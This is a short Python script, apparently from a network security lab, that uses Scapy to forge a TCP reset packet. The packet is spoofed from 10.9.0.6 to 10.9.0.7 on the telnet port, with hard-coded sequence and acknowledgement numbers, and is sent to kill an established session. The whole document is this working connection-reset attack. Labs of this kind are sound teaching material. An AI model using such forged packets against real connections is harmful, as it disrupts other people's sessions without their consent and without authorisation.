#!/usr/bin/env python3
from scapy.all import *
ip = IP(src="10.9.0.6", dst="10.9.0.7")
tcp = TCP(sport=57484, dport=23, flags="R", seq=2626768703, ack=3453954169)
pkt = ip/tcp
ls(pkt)
send(pkt,verbose=0)